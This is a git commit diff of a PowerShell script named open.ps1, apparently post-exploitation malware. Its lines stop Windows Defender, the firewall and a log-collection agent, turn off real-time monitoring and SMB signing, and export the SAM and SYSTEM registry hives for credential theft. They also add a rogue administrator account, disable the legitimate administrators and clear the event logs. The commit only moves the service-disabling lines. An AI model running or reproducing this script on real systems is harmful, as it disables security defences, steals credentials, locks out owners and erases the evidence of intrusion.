3bb9e8908f7df02d0654bacfb3d5023652b5911d
stefanos007 <omgandthreelols@gmail.com>
2024-04-04 13:21:34 +0300

    Update open.ps1

--- open.ps1
+++ open.ps1
@@ -1,12 +1,10 @@
 $id=(Get-Process -Name "lsass").id
 $pwd=ConvertTo-SecureString -String "Temp@123" -AsPlainText -Force
 
-Stop-Process -Name "WinCollectSvc" -Force -ErrorAction Ignore
-Stop-Process -Name "WinCollect" -Force -ErrorAction Ignore
 Stop-Process -Name "MsMpEng" -Force -ErrorAction Ignore
+
 Stop-Service -Name "mpssvc" -Force -ErrorAction Ignore
 Stop-Service -Name "CiscoSCMS" -Force -ErrorAction Ignore
-Stop-Service -Name "WinCollect" -Force -ErrorAction Ignore
 Stop-Service -Name "WinDefend" -Force -ErrorAction Ignore
 Stop-Service -Name "SNMP" -Force -ErrorAction Ignore
 Stop-Service -Name "W3SVC" -Force -ErrorAction Ignore
@@ -15,10 +13,6 @@ Set-SmbServerConfiguration -EnableSMB2Protocol $false -Force -ErrorAction Ignore
 Set-SmbServerConfiguration -EnableSecuritySignature $false -RequireSecuritySignature $false -Force
 Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False -ErrorAction Ignore
 Set-MpPreference -DisableRealtimeMonitoring $true
-
-Set-Service -Name "WinCollect" -StartupType Disabled
-Set-Service -Name "W3SVC" -StartupType Disabled
-Set-Service -Name "SNMP" -StartupType Disabled
 
 Invoke-Command {reg export 'HKLM\SAM' C:\sam.reg}
 Invoke-Command {reg export 'HKLM\SYSTEM' C:\system.reg}
@@ -29,6 +23,13 @@ Add-LocalGroupMember -Group "Administrators" -Member "0xDEADDEAD"
 Remove-LocalGroupMember -Group "Administrators" -Member "algo"
 Disable-LocalUser -Name "algo"
 Disable-LocalUser -Name "Administrator"
+
+Stop-Process -Name "WinCollectSvc" -Force -ErrorAction Ignore
+Stop-Process -Name "WinCollect" -Force -ErrorAction Ignore
+Stop-Service -Name "WinCollect" -Force -ErrorAction Ignore
+Set-Service -Name "WinCollect" -StartupType Disabled
+Set-Service -Name "W3SVC" -StartupType Disabled
+Set-Service -Name "SNMP" -StartupType Disabled
 
 Clear-EventLog -LogName System
 Clear-EventLog -LogName Application
